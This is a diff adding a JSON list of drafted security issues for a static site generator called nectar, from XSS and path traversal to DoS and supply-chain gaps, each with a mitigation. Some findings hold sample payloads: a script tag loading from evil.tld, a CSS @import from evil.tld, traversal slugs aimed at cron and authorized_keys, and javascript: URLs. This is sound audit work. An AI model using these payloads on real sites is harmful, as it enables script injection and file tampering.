@@ -1,0 +1,357 @@
+[
+  {
+    "title": "security: marked configured with raw HTML passthrough enables stored XSS in posts",
+    "body": "src/content/markdown.ts instantiates marked with `{ gfm: true, breaks: false }` and no sanitizer. marked v14 dropped its built-in `sanitize` option, so raw HTML inside any Markdown file (`<script>`, `<iframe>`, event handlers, `javascript:` URLs) is passed verbatim into post.html and then emitted into output HTML via `{{{content}}}` / `{{{body}}}` / the `content` helper (which wraps in SafeString). Threat: any contributor who can land Markdown — outside PR author, importer of a malicious Ghost export, or anyone with write access to content/ — gains full stored XSS on every reader. Impact: account takeover via session theft on hosted blogs that share an origin with auth, defacement, malware drive-by. Mitigation: pipe rendered HTML through DOMPurify / sanitize-html with an opt-out flag (`unsafeHtml: true` per post for trusted authors), and explicitly forbid `<script>`, event handlers, `javascript:` / `data:` URLs in `href`/`src`. Document that the default is sanitised.",
+    "labels": ["security", "P0", "content"]
+  },
+  {
+    "title": "security: gray-matter uses js-yaml with default schema (code-exec types disabled, but custom tags still parsed)",
+    "body": "src/content/frontmatter.ts calls `matter(raw)` with no options, so gray-matter v4 uses js-yaml v3 in default mode. js-yaml v3 in default mode disables `!!js/function`, `!!js/regexp`, and `!!js/undefined` (those require `LOAD_FULL_SCHEMA`), so direct RCE via YAML deserialisation is blocked. However: (a) gray-matter caches parsed results by content key in a module-global, allowing memory growth across watch runs; (b) gray-matter also auto-tries the `js` engine on `---js` blocks which `eval`s JavaScript — if a contributor switches the fence to `---js ... ---` the body is `eval()`-ed in the build process. Mitigation: explicitly pass `{ engines: { yaml: (s) => yaml.load(s, { schema: yaml.FAILSAFE_SCHEMA }) }, language: 'yaml' }` and reject any non-YAML language tag. See https://github.com/jonschlinkert/gray-matter#optionsengines.",
+    "labels": ["security", "P0", "content", "supply-chain"]
+  },
+  {
+    "title": "security: codeinjection_head / codeinjection_foot from any Markdown frontmatter inject raw HTML",
+    "body": "src/content/loader.ts:224-225 reads `codeinjection_head` / `codeinjection_foot` as strings from frontmatter and pipes them into post.html via the `ghost_head` / `ghost_foot` helpers (src/render/helpers/ghost-head.ts:48-56) using `new SafeString(head)`. There is no allow-list and no per-post toggle. Threat: a contributor PR that adds a post with `codeinjection_foot: \"<script src=//evil.tld/x.js></script>\"` ships site-wide JS once merged. Impact: persistent XSS / token exfiltration / coinminer. Mitigation: gate these fields behind config (`build.allow_code_injection = false` by default), require explicit per-post opt-in, or document loudly that PRs touching these fields need extra review. The README/SECURITY.md does not currently call this out.",
+    "labels": ["security", "P0", "render", "content"]
+  },
+  {
+    "title": "security: frontmatter `slug` allows arbitrary path traversal for output filenames",
+    "body": "src/content/loader.ts:183 takes `asString(data.slug)` verbatim — no normalisation, no `slugify()`, no character whitelist. The slug then drives `outputPath = \"${post.slug}/index.html\"` in src/build/routes.ts:40-42, and finally `writeFile(join(outputDir, outputPath), …)` in src/build/emit.ts:7. A malicious slug like `../../../../etc/cron.d/evil` (or on Windows, `..\\..\\..\\Users\\Public\\xxx`) escapes outputDir and writes attacker-controlled HTML to arbitrary filesystem locations runnable as the build user. The same applies to tags/authors via src/content/loader.ts:251 and 282 when frontmatter `slug:` is provided (the fallback path uses slugify; the explicit override does not). Mitigation: always pass user-supplied slug through `slugify(s, { strict: true, lower: true })` and assert the joined path stays under outputDir.",
+    "labels": ["security", "P0", "content", "routes"]
+  },
+  {
+    "title": "security: Ghost import trusts `post.slug` and writes to arbitrary paths via `${slug}.md`",
+    "body": "src/ghost/import.ts:126 falls back to `slugify(post.title)` only when `post.slug` is empty. If the export contains `\"slug\": \"../../.ssh/authorized_keys\"`, the destination is `join(cwd, 'content/posts', '../../.ssh/authorized_keys.md')`, which `path.join` resolves outside the content directory. `writeFile` then clobbers files outside the project. Same issue for `tag.slug` (line 165) and `user.slug` (line 181). Threat model: user runs `nectar import-ghost some-export.json` on an export sourced from an untrusted backup, hosted file, or compromised Ghost instance. Mitigation: re-slugify every slug from the export, and assert the resolved path is under `join(cwd, 'content/posts')` etc.",
+    "labels": ["security", "P0", "migration", "content"]
+  },
+  {
+    "title": "security: Ghost import does no size or shape validation before JSON.parse (DoS / OOM)",
+    "body": "src/ghost/import.ts:91-92 reads the entire export file into a string and JSON.parses it with no streaming and no size cap. A user pointed at a multi-GB Ghost export (legit large blogs or maliciously inflated JSON via repeated keys / deeply nested arrays) blows process memory and may crash the host. JSON.parse also exhibits worst-case quadratic behaviour on certain inputs. Mitigation: stat the file first and refuse > some configurable cap (e.g. 256 MB default); consider a streaming JSON parser (stream-json) for very large exports; document max size.",
+    "labels": ["security", "P1", "migration", "performance"]
+  },
+  {
+    "title": "security: turndown processes Ghost HTML with no size/timeout — ReDoS / memory blowup risk",
+    "body": "src/ghost/import.ts:8 instantiates `new TurndownService(...)` once, then calls `turndown.turndown(post.html)` per post (line 205) with no length limit. Turndown internally builds a DOM via @mixmark-io/domino and runs many regexes; a maliciously authored Ghost post body (e.g. millions of nested empty tags or a pathological string for one of turndown's collapsed-whitespace regexes) can pin a CPU core or exhaust memory. Mitigation: cap per-post HTML length (e.g. 10 MB), wrap turndown in a try/catch and skip with a warning if it throws, and consider running large imports in a child worker so OOM does not kill the CLI.",
+    "labels": ["security", "P2", "migration", "performance"]
+  },
+  {
+    "title": "security: TOML config parsed with no size cap (compression-bomb / OOM)",
+    "body": "src/config/loader.ts:18-20 reads `nectar.toml` with `readFile` (no size limit) then `@iarna/toml` parses it. @iarna/toml is pure JS and reasonably robust, but it has no built-in depth or length cap, so a 500 MB `nectar.toml` will be loaded entirely into memory. Less a realistic remote attack and more a footgun for shared CI runners. Mitigation: stat the config file and refuse files over (say) 1 MB.",
+    "labels": ["security", "P3", "config"]
+  },
+  {
+    "title": "security: theme partials path traversal via crafted `partials/` filenames is unbounded",
+    "body": "src/theme/loader.ts:37-48 globs `**/*.hbs` under the theme dir and registers everything under `partials/` as a partial whose name is the relative path. There is no follow-symlink check on `Bun.Glob.scan`. An untrusted theme could ship a symlink at `partials/foo.hbs -> /etc/passwd` (or any sensitive file on the build host) which `readFile` would then slurp and register; depending on how it is referenced, the contents land in the output HTML. Same hazard applies to the templates scan and to `loadThemeAssets` (src/theme/assets.ts:11). Mitigation: pass `followSymlinks: false` (Bun.Glob default is currently true per docs — verify), or stat each entry with `lstatSync` and reject symlinks, or refuse paths whose resolved real path leaves the theme root.",
+    "labels": ["security", "P1", "theme-dev"]
+  },
+  {
+    "title": "security: Bun.Glob scans for content/assets follow symlinks by default",
+    "body": "Same root cause as the theme issue: src/content/loader.ts:157 (content), src/build/emit.ts:38 (content/images), and src/theme/assets.ts:10 use `new Bun.Glob('**/*').scan(...)` with no symlink filtering. A malicious contributor PR adding `content/posts/oops.md -> /home/runner/.npmrc` causes the build to read and (in the case of assets) ship secrets into the published `dist/`. Mitigation: explicitly opt out of symlinks via Bun.Glob options or by `lstatSync`+`isSymbolicLink()` filter; document that content directories must contain only regular files.",
+    "labels": ["security", "P1", "content"]
+  },
+  {
+    "title": "security: `rm -rf outputDir` runs without confirmation; misconfigured `output_dir` deletes user files",
+    "body": "src/build/pipeline.ts:25-26 computes `outputDir = join(cwd, config.build.output_dir)` and immediately `rm(outputDir, { recursive: true, force: true })`. There is no check that `output_dir` is inside cwd (a user setting `output_dir = \"../..\"` in nectar.toml wipes their parent directory), no check that it differs from `cwd` itself (`output_dir = \".\"` deletes the project), no protection against absolute paths (`/`), and no preserve-list. Threat: a malicious PR that tweaks `nectar.toml` to `output_dir = \"/Users/runner\"` weaponises a CI build into data destruction. Mitigation: refuse absolute paths, refuse paths that resolve outside cwd, refuse `.` / empty, and clear the dist directory by deleting children rather than the directory itself.",
+    "labels": ["security", "P0", "config", "infra"]
+  },
+  {
+    "title": "security: `nectar new` overwrites existing files without prompt",
+    "body": "src/cli/commands/new.ts:33 unconditionally `writeFile(dest, …)`. Running `nectar new post \"Existing Post\"` on a title that slugifies to an existing slug clobbers the previous post — no `--force` flag required, no collision check. Same issue in `nectar import-ghost` (overwrites content/posts/<slug>.md on every run). Mitigation: refuse to overwrite unless `--force` is passed, or write to `<slug>-<n>.md` when collisions exist.",
+    "labels": ["security", "P2", "cli"]
+  },
+  {
+    "title": "security: serve command path normalisation may allow traversal on Windows / decoded URLs",
+    "body": "src/cli/commands/serve.ts:21-27 builds `filePath = normalize(join(distDir, url.pathname))` and rejects if `!filePath.startsWith(distDir)`. Issues: (1) `distDir` lacks a trailing separator, so `dist` matches `distOther` (low impact since outputDir is normally not adjacent to lookalikes, but the check is incorrect in principle); (2) `url.pathname` is URL-decoded by `new URL`, so `%2e%2e/secret` becomes `../secret` before the join — relying on `normalize` to collapse `..` is OK on POSIX but `path.normalize` does *not* resolve `..` past the root when the path is relative, which can lead to surprising results on Windows where `\\` is also a separator; (3) no defence against backslash in URL path on Windows. The serve command is documented as 'local only' but operators sometimes proxy it; document loudly that it is not production-grade. Mitigation: use `path.resolve` + `realpathSync` and compare `filePath.startsWith(distDir + path.sep)`.",
+    "labels": ["security", "P2", "cli"]
+  },
+  {
+    "title": "security: serve command binds to all interfaces and has no auth / rate limit",
+    "body": "Bun.serve in src/cli/commands/serve.ts has no `hostname` option, so it binds 0.0.0.0 on most platforms. On a developer laptop on coffee-shop Wi-Fi this exposes the unbuilt dist contents (which may include draft excerpts, source maps, etc.) to anyone on the LAN. No rate limit, no concurrency cap, no request log. Mitigation: default `hostname: '127.0.0.1'`, add `--host` flag for explicit binds, document that `nectar serve` is not production.",
+    "labels": ["security", "P2", "cli"]
+  },
+  {
+    "title": "security: theme `package.json` is JSON.parsed with no schema validation; custom defaults flow into HTML",
+    "body": "src/theme/pkg.ts:27 does `JSON.parse(raw) as RawPkg` with no zod schema. Whatever the theme author put under `config.custom.<key>.default` is propagated through `engine.theme.pkg.customDefaults` into `buildCustom()` (src/render/engine.ts:141-146) and reachable from templates as `{{@custom.foo}}`. Many themes (including the bundled `source` theme) interpolate `@custom.*` into `<style>` blocks and inline scripts (see default.hbs:23 `--background-color: {{@custom.site_background_color}}`). If the theme ships a default like `\"site_background_color\": \"#fff; } body { display: none; } /*\"` or, worse, `\"</style><script>alert(1)</script>\"`, the user's `<style>` block is broken out of. Mitigation: validate theme package.json with zod (whitelist types text|color|select|boolean|image; coerce defaults to safe values), and when the theme inserts `@custom.*` into HTML contexts the engine should HTML-encode by default (recommend triple-stash only for explicitly-safe values).",
+    "labels": ["security", "P1", "theme-dev"]
+  },
+  {
+    "title": "security: locale JSON files are loaded with no schema validation; values used in HTML via triple-stash",
+    "body": "src/theme/loader.ts:80-99 globs `locales/*.json`, JSON.parses each, and stores the string map. The `t` helper (src/render/helpers/i18n.ts) returns the raw string, and themes frequently use `{{{t \"...\"}}}` (e.g. example theme's footer.hbs:16 contains a triple-stash `t` with literal `<a>` markup, and post-card.hbs:39 uses `{{{t \"By {authors}\"}}}`). A malicious or compromised locale file can inject `<script>` into every page. Mitigation: by default escape `t` output, expose a `t-safe` variant for trusted markup; validate locale JSON shape (string keys -> string values, length cap) and warn on suspicious tokens.",
+    "labels": ["security", "P1", "theme-dev", "i18n"]
+  },
+  {
+    "title": "security: scheduled posts are not filtered, so future-dated content is published silently",
+    "body": "src/content/loader.ts:30 skips only `status === 'draft'`. A post with `status: scheduled` (the type union allows it on line 110) is treated as published and rendered. Threat: an author who intends to schedule a post for a later date discovers it is already public. This is also an information-disclosure path (embargoed announcements leak via RSS / sitemap). Mitigation: skip scheduled until `published_at <= now`, and document the date semantics.",
+    "labels": ["security", "P1", "content"]
+  },
+  {
+    "title": "security: draft filenames may still leak via output_dir if a previous build emitted them",
+    "body": "src/build/pipeline.ts:26 deletes outputDir before each build, so within a single run drafts are not emitted. However, if the user uses `--no-clean` (not currently a flag, but a likely future addition) or copies dist between builds, old draft HTML persists. Today the main leak is via build logs: `logger.info` echoes counts but not filenames, but `logger.error` in pipeline.ts:42 prints `Failed to render ${route.url} (${route.template})` which can include draft slugs if a route plan ever includes them. Mitigation: never include drafts in route planning; document the clean-build behaviour; ensure `nectar check` does not print draft slugs unless verbose.",
+    "labels": ["security", "P3", "content"]
+  },
+  {
+    "title": "security: navigation labels and URLs are inserted into HTML with only HTML-text escaping (no URL-scheme validation)",
+    "body": "src/render/helpers/navigation.ts:14-16 builds `<a href=\"${escapeAttr(item.url)}\">…</a>` from config-supplied `navigation[*].url`. `escapeAttr` HTML-encodes quotes but does *not* reject `javascript:` URLs. A config that contains `url = \"javascript:alert(document.cookie)\"` produces a clickable XSS link on every page. Same pattern in pagination links, `link` helper. Mitigation: validate that `url` parses as a relative path or has scheme http(s) / mailto; refuse `javascript:` / `data:` / `vbscript:`.",
+    "labels": ["security", "P1", "render", "config"]
+  },
+  {
+    "title": "security: `link` helper accepts arbitrary `target` and lacks `rel=noopener` by default",
+    "body": "src/render/helpers/navigation.ts:40-48 emits `<a … target=\"${escapeAttr(target)}\">` with no `rel=\"noopener noreferrer\"` injection. Themes using `{{#link target=\"_blank\"}}` to off-site URLs leak `window.opener` to the target page, enabling tabnabbing. Mitigation: when `target=_blank` is present, automatically append `rel=\"noopener noreferrer\"` (or refuse without it).",
+    "labels": ["security", "P2", "render"]
+  },
+  {
+    "title": "security: `social_url` helper for Mastodon trusts user-supplied host in handle",
+    "body": "src/render/helpers/urls.ts:48-53: when the Mastodon handle contains an `@`, the helper splits on it and emits `https://${host}/@${user}` with no validation of `host`. A handle of `me@evil.example/?\" onmouseover=alert(1) x=\"` produces a URL containing a quote that breaks out of any unescaped HTML attribute context. While Handlebars triple-stash escapes by default, helpers like `<a href=\"{{social_url type=\\\"mastodon\\\"}}\">` rely on Handlebars' attribute escaping, which does not validate URL syntax. Mitigation: validate the host against a hostname regex, refuse malformed inputs, return empty string.",
+    "labels": ["security", "P2", "render"]
+  },
+  {
+    "title": "security: `asset` helper emits the URL inside a SafeString without context-aware encoding",
+    "body": "src/render/helpers/assets.ts:21 returns `new SafeString(escapeHtml(url + …))`. The `escapeHtml` only encodes `&<>`, missing `\"` and `'`. If the URL ends up inside `href=\"…\"` (the usual case) Handlebars' own attribute escape would normally save us, but a SafeString *skips* further escaping. So an asset filename like `a\"><script>x</script>.css` (file names with `\"` are legal on POSIX) ends up unencoded in the attribute. Mitigation: encode for attribute context (or simply not wrap in SafeString and let Handlebars escape) — or reject filenames containing `<`, `>`, `\"`, `'`, backticks at load time.",
+    "labels": ["security", "P2", "render"]
+  },
+  {
+    "title": "security: `tags` helper builds links with handcrafted `escapeAttr` that misses unicode tricks",
+    "body": "src/render/helpers/content.ts:73 produces `<a href=\"${escapeAttr(tag.url)}\">${escapeHtml(tag.name)}</a>`. `tag.url` is computed from `joinUrl(site.url, '/tag/${slug}/')`. If a contributor sets `slug: \\\"><script>...\\\"` (after we fix the slug-traversal issue, the slug is sanitized — but the current code does not sanitize override slugs), the malformed slug lands in the href. Also the `escapeAttr` here does not encode `(` or `)` — combine with `javascript:alert(1)`-style payloads when scheme validation is missing. Mitigation: validate slugs with `slugify(s, { strict: true })`, validate URLs, and use Handlebars' built-in attribute escaping rather than custom regex.",
+    "labels": ["security", "P2", "render", "content"]
+  },
+  {
+    "title": "security: foreach helper exposes `index/number/first/last` data on a frame derived from caller-controlled options.data",
+    "body": "src/render/helpers/blocks.ts:23 calls `engine.hb.createFrame((options.data as Record<string, unknown> | undefined) ?? {})`. Because the helper is invoked from theme templates, a theme author can pass a custom `@data` and trigger Handlebars-prototype-pollution-like behaviour. Handlebars 4.7.7+ closed the known prototype access path; the casts here are safe in practice but the code should be defensive. Mitigation: use `Object.create(null)` for frames built from untrusted helper data, and pin handlebars to 4.7.8+ explicitly (already in package.json — keep it that way and watch for new CVEs).",
+    "labels": ["security", "P3", "render", "supply-chain"]
+  },
+  {
+    "title": "security: filter mini-DSL in `get` helper interpolates `{{...}}` against arbitrary context — potential injection between posts",
+    "body": "src/render/helpers/blocks.ts:262-268 in `evaluateClause` substitutes `{{post.id}}` style references against the current render context. The substituted value is then used as a literal in field comparison. While the result is only used in equality checks (no eval), the helper allows a theme to read arbitrary context fields and use them to filter content. If a future change extends the DSL to support comparisons (`~`, `~^`, etc.) without escaping, this becomes a stored XSS / template-injection vector. Mitigation: cap interpolation to a small whitelist of fields (id, slug, primary_tag.slug), reject `{{ ... | ... }}` payloads, and unit-test the boundary.",
+    "labels": ["security", "P3", "render"]
+  },
+  {
+    "title": "security: handlebars partial recursion is unbounded — infinite-loop DoS via theme",
+    "body": "src/render/engine.ts:60-72 registers every template/partial under both `name` and `partials/name`. There is no detection of cyclic partials (`a.hbs` includes `{{> b}}`, `b.hbs` includes `{{> a}}`). Handlebars itself does not stop infinite recursion; the build will hang or stack-overflow. Threat: malicious theme. Mitigation: track a render-depth counter in a private data frame (`@depth`) and throw if it exceeds e.g. 64, or do a static cycle check at theme-load time.",
+    "labels": ["security", "P2", "theme-dev", "performance"]
+  },
+  {
+    "title": "security: Markdown render is unbounded — single 1 GB post blocks the build",
+    "body": "src/content/markdown.ts:14 calls `marked.parse(body)` on whatever fits in a `string`. There is no per-post size cap. A contributor PR with a 500 MB Markdown file (or a small file with deeply nested blockquotes / lists) can OOM the build runner. Bun strings cap at 2 GB; even close to that bound, marked's tokenizer is quadratic in some pathological inputs. Mitigation: stat each .md file at load, refuse > N MB (configurable, default e.g. 5 MB), and consider an explicit `marked` token-count guard.",
+    "labels": ["security", "P2", "content", "performance"]
+  },
+  {
+    "title": "security: marked GFM tables / autolink regexes have a history of ReDoS — pin marked and track CVEs",
+    "body": "package.json pins `marked: ^14.1.4`. Marked has had multiple ReDoS CVEs (e.g. CVE-2022-21680, CVE-2022-21681 in older majors; v14 is current but new ones land regularly). With no Renovate / Dependabot config in repo, transitive patch versions only update at human pace. Mitigation: enable Dependabot or Renovate, run `bun pm scan` (after configuring a scanner) in CI, and add a SECURITY.md describing the disclosure policy.",
+    "labels": ["security", "P1", "supply-chain"]
+  },
+  {
+    "title": "security: no SECURITY.md / vulnerability disclosure policy",
+    "body": "Repo lacks a SECURITY.md, a `security@` contact, and any private disclosure channel. External researchers have nowhere to report issues responsibly. Mitigation: add SECURITY.md per https://github.com/github/SECURITY.md template; enable GitHub Private Vulnerability Reporting; list supported versions and triage SLAs.",
+    "labels": ["security", "P1", "docs"]
+  },
+  {
+    "title": "security: no Dependabot / Renovate / scheduled `bun pm scan` configured",
+    "body": "There is no .github/dependabot.yml, no renovate.json, and `bun pm scan` requires a configured scanner (`[install.security] scanner = ...` in bunfig.toml) which is also absent. Dependencies will silently age; new CVEs in handlebars / marked / gray-matter / turndown will go unnoticed. Mitigation: add Dependabot for the bun/npm ecosystem, configure a scanner package (e.g. `@socketsecurity/scanner` or similar) in bunfig.toml, and run `bun pm scan` in CI on pushes to main and on PRs.",
+    "labels": ["security", "P1", "supply-chain", "infra"]
+  },
+  {
+    "title": "security: no SBOM and no provenance / signed releases",
+    "body": "Repo does not generate an SBOM (CycloneDX / SPDX), the project is not published yet (`private: true`) but once published there is no plan for `--provenance` (npm) or sigstore signing. Downstream consumers cannot verify the published tarball was built from the claimed commit. Mitigation: when releasing, publish with `npm publish --provenance` from GitHub Actions, and add a CI job that emits a CycloneDX SBOM as a release asset.",
+    "labels": ["security", "P2", "supply-chain", "infra"]
+  },
+  {
+    "title": "security: bun.lock present but no integrity-only install check in CI",
+    "body": "`bun.lock` exists, but there is no CI workflow at all in .github/ (none exists in repo). On `bun install` Bun verifies tarball hashes against the lockfile, but human-run installs on contributor machines can silently miss tampering. Mitigation: add a CI workflow that runs `bun install --frozen-lockfile` and `bun pm scan`, and document `--frozen-lockfile` for contributors.",
+    "labels": ["security", "P2", "infra", "supply-chain"]
+  },
+  {
+    "title": "security: no CI at all — no automated lint/test/audit on PRs",
+    "body": "Confirmed via `ls .github/` (file missing). The Biome `check`, `tsc --noEmit`, and `bun test` scripts in package.json are never run automatically. A malicious PR can land with broken types or smuggled dependencies if a maintainer merges quickly. Mitigation: add `.github/workflows/ci.yml` running typecheck + biome + tests + `bun pm scan` on PR.",
+    "labels": ["security", "P1", "infra"]
+  },
+  {
+    "title": "security: build process prints stack traces to stderr (information disclosure to CI logs)",
+    "body": "src/cli/commands/build.ts:16 logs `err.stack ?? err.message`. Pipeline.ts:42 logs `Failed to render ${route.url}` before re-throwing. Stack traces in CI logs reveal absolute paths under `/home/runner/...` or `/Users/<name>/...`, sometimes including private package names. Public CI logs (e.g. Actions on open-source repos) become a fingerprinting surface. Mitigation: in non-debug mode log only the error message; gate stack output behind `NECTAR_DEBUG=1`.",
+    "labels": ["security", "P3", "observability"]
+  },
+  {
+    "title": "security: example theme inserts user-controlled `@custom.site_background_color` into a `<style>` block (CSS injection / breakout)",
+    "body": "example/themes/source/default.hbs:23 contains `--background-color: {{@custom.site_background_color}}`. Inside a `<style>` block, Handlebars' HTML-escape does not protect against CSS-context attacks like `red; } body { display: none } @import url('//evil.tld/x.css'); /*`. A user can land that string in their nectar.toml `[theme.custom]` table, or it can come from a malicious theme's defaults (see separate finding). Mitigation: in the helper resolving `@custom.color`, validate against `^#[0-9a-fA-F]{3,8}$` or a `color()` whitelist; never inline arbitrary strings into `<style>`.",
+    "labels": ["security", "P1", "render", "theme-dev"]
+  },
+  {
+    "title": "security: sha1 short prefix (10 chars) for asset cache-busting is collision-prone",
+    "body": "src/theme/assets.ts:38-43 truncates SHA-1 to 10 hex chars. With ~10^12 buckets and a typical theme with <500 assets, collisions are improbable but not impossible — and SHA-1 itself is broken for collision resistance. The real risk is not security but cache poisoning: two distinct assets sharing a fingerprinted filename means a CDN serves the wrong content to readers after a rebuild. Mitigation: use SHA-256 truncated to 16 hex chars, or include the original path in the fingerprint to make collisions practically impossible.",
+    "labels": ["security", "P3", "render"]
+  },
+  {
+    "title": "security: asset fingerprinted only for .css/.js/.mjs — fonts, images, source maps go un-fingerprinted",
+    "body": "src/theme/assets.ts:33-36 fingerprints only `.css/.js/.mjs`. A theme that ships a `.map` source map for built JS will serve it at a stable path, leaking unminified source to readers. Mitigation: either skip emitting source maps in production builds or fingerprint them too; allow theme authors to declare extra fingerprintable extensions.",
+    "labels": ["security", "P3", "render"]
+  },
+  {
+    "title": "security: copyContentAssets silently swallows errors (catch {})",
+    "body": "src/build/emit.ts:48 wraps the copy in `try { … } catch {}` to make `content/images` optional. This hides real errors (permission denied, ENOSPC, symlink loops). A symlink loop or unreadable file fails the copy without any user feedback, leaving a broken site. Mitigation: only swallow ENOENT on the root directory; log all other errors at warn level.",
+    "labels": ["security", "P3", "observability", "content"]
+  },
+  {
+    "title": "security: feeds emit `<![CDATA[…]]>` of post.html without escaping `]]>` sequence",
+    "body": "src/build/feeds.ts:36 wraps `${post.html}` in a CDATA section. If `post.html` contains the literal sequence `]]>` (legal in HTML, common in code-block examples), the CDATA ends prematurely and the rest of the RSS document is corrupted (or worse, attacker-controlled markup is interpreted as RSS). Mitigation: split `]]>` into `]]]]><![CDATA[>` (the standard RSS-safe replacement) before insertion.",
+    "labels": ["security", "P2", "rss"]
+  },
+  {
+    "title": "security: sitemap entries use a hand-rolled escapeXml that misses control characters",
+    "body": "src/build/feeds.ts:53-60 replaces only `& < > \" '`. XML 1.0 forbids most ASCII control bytes; if a slug or URL ever contains them (rare but possible after future feature additions like custom permalinks), the produced sitemap.xml is invalid and may be rejected by search engines, or fed to a buggy XML parser. Mitigation: strip / encode `[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F]` before XML emission.",
+    "labels": ["security", "P3", "sitemap"]
+  },
+  {
+    "title": "security: navigation `slugify` for nav CSS class names is naive and can produce attacker-controlled class with `\"`/`'`",
+    "body": "src/render/helpers/navigation.ts:71-76 strips `[^\\w]+` from labels — Unicode word characters in JS `\\w` *do not* include letters from non-Latin scripts in legacy mode, but the regex uses default mode which is ASCII-only, so it actually maps everything non-ASCII to `-`. That part is safe. The real bug is that the class name is then dropped into `class=\"nav-${slug}\"` with no quoting — but since slugify already strips quotes and `<`/`>`, this is OK. Document the invariant in a code comment so a future refactor does not break it.",
+    "labels": ["security", "P3", "render"]
+  },
+  {
+    "title": "security: `link_class` and `link` helpers take `for=`/`href=`/`target=` from theme without origin checking",
+    "body": "Themes can pass any string. While these helpers HTML-escape attribute values, they do not validate URL schemes — `{{#link href=\"javascript:alert(1)\"}}Click{{/link}}` renders a working XSS link. Mitigation: refuse non-http(s)/mailto/relative href in `link`, document the constraint, and add a test.",
+    "labels": ["security", "P2", "render"]
+  },
+  {
+    "title": "security: date helper formats untrusted format string via dayjs — limited but still concerning",
+    "body": "src/render/helpers/date.ts:33 takes `options.hash.format` from the theme. dayjs format tokens are safe (no eval), but a theme can use this to render misleading dates (e.g. always show the year as 1970) to defraud readers, or hide updated_at to make stale content look fresh. Lower priority; documenting it so theme reviewers know.",
+    "labels": ["security", "P3", "theme-dev"]
+  },
+  {
+    "title": "security: no Content-Security-Policy guidance for hosted sites",
+    "body": "README.md does not document recommended HTTP response headers for hosting. Given that the engine emits raw HTML from Markdown plus `codeinjection_*` plus theme-controlled inline scripts, a strict CSP is essential. Without guidance, users deploy to Netlify/Vercel/GitHub Pages with no CSP, no Referrer-Policy, no Permissions-Policy. Mitigation: ship a `docs/security/hosting.md` with `_headers` / `netlify.toml` / `vercel.json` snippets enabling: `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' …`, `Referrer-Policy: strict-origin-when-cross-origin`, `X-Content-Type-Options: nosniff`, `Strict-Transport-Security: max-age=31536000`, `Permissions-Policy: interest-cohort=()`, etc.",
+    "labels": ["security", "P1", "docs"]
+  },
+  {
+    "title": "security: no Subresource Integrity (SRI) for fingerprinted assets",
+    "body": "Assets are fingerprinted by filename but no `integrity=\"sha256-…\"` attribute is emitted on `<link>` / `<script>` tags. If a user serves CSS/JS from a CDN that gets compromised, browsers cannot reject tampered files. Mitigation: extend the `asset` helper to optionally emit SRI hashes when invoked from `<link>` / `<script>` contexts (`{{asset 'x.js' integrity=true}}` or a dedicated `sri` helper).",
+    "labels": ["security", "P2", "render"]
+  },
+  {
+    "title": "security: `import-ghost` does not check for path collisions before overwriting existing content",
+    "body": "src/ghost/import.ts:155 writes `content/posts/${slug}.md` unconditionally. Re-running the importer (or running it against an export that has two posts sharing a slug, which is invalid Ghost but possible in tampered exports) silently overwrites prior files. The user may have made local edits between imports. Mitigation: refuse to overwrite without `--force`; emit a report listing files that would change.",
+    "labels": ["security", "P2", "migration", "cli"]
+  },
+  {
+    "title": "security: import-ghost trusts post.html for turndown but inlines user `feature_image` / `*_image` URLs into frontmatter without scheme check",
+    "body": "src/ghost/import.ts:136-152 forwards `feature_image`, `og_image`, `twitter_image`, `profile_image`, `cover_image` strings into `JSON.stringify`-quoted frontmatter. A compromised export can set these to `javascript:alert(1)` or `data:text/html,<script>…</script>`, which later flow through the templates into `<img src>` / `<meta og:image>`. Mitigation: validate that the URL is http(s):// (or a relative path) before writing it to frontmatter; refuse `javascript:`/`data:`/`file:` and log a warning.",
+    "labels": ["security", "P1", "migration", "content"]
+  },
+  {
+    "title": "security: import-ghost preserves `codeinjection_head/foot` verbatim — no review prompt",
+    "body": "src/ghost/import.ts:152-153 round-trips `codeinjection_head`/`codeinjection_foot` from the Ghost export straight into frontmatter. Users importing exports from blogs they no longer control (sold, taken over) silently inherit attacker scripts. Mitigation: by default *omit* code injection fields and emit a summary like `Skipped code injection in 7 posts. Re-run with --keep-code-injection to import them.`",
+    "labels": ["security", "P1", "migration"]
+  },
+  {
+    "title": "security: ghost_head emits JSON-LD with `JSON.stringify(jsonLd)` — `</script>` inside fields breaks out",
+    "body": "src/render/helpers/ghost-head.ts:45 emits `<script type=\"application/ld+json\">${JSON.stringify(jsonLd)}</script>`. JSON.stringify does *not* escape `<` or `/`, so if any field (title, description, author name, site title) contains the literal sequence `</script>`, it ends the script tag and the rest is HTML — stored XSS. Mitigation: replace `<` with `\\u003c` in the serialised JSON (standard fix), e.g. `JSON.stringify(jsonLd).replace(/</g, '\\\\u003c')`.",
+    "labels": ["security", "P0", "render", "seo"]
+  },
+  {
+    "title": "security: ghost_head canonical, og:url derived from `site.url + route.url` without validating site.url",
+    "body": "src/render/helpers/ghost-head.ts:85 constructs canonical via `new URL(path, base)`. If `site.url` in config is `javascript:` (yes, `new URL('/', 'javascript:foo')` throws — but `new URL('/', 'http://x\\\"')` does not throw and produces nonsense). A misconfigured `site.url` can poison every canonical / og:url / RSS link. Mitigation: zod-validate `site.url` as a strict http(s) URL at config load.",
+    "labels": ["security", "P2", "config", "render"]
+  },
+  {
+    "title": "security: config schema does not validate URLs / colors / locales",
+    "body": "src/config/schema.ts: every `z.string()` accepts arbitrary content. `site.url` is not URL-checked. `site.accent_color` is a free-form string — themes that drop it into CSS open CSS-injection (already covered by separate finding). `site.locale` is unconstrained and used as `<html lang=\\\"…\\\">`. Mitigation: tighten schema with `z.string().url()`, regex for accent_color, BCP-47 regex for locale.",
+    "labels": ["security", "P2", "config"]
+  },
+  {
+    "title": "security: `nectar new` writes file with title interpolated into frontmatter via JSON.stringify — OK but slug not validated",
+    "body": "src/cli/commands/new.ts:20-25: title is JSON.stringified (safe for YAML quotes), but the derived slug comes only from `slugify(title, { strict: true })` — which is robust. The remaining concern is that `dest` is `join(cwd, baseDir, '${slug}.md')` and `cwd` is `process.cwd()`. If the user runs `nectar new` from outside the project root, content is created in the wrong place silently. Mitigation: detect project root by locating `nectar.toml` upward; refuse if not inside a project.",
+    "labels": ["security", "P3", "cli"]
+  },
+  {
+    "title": "security: handlebars `compile` is invoked at render time per route inside renderRoute (perf + DoS)",
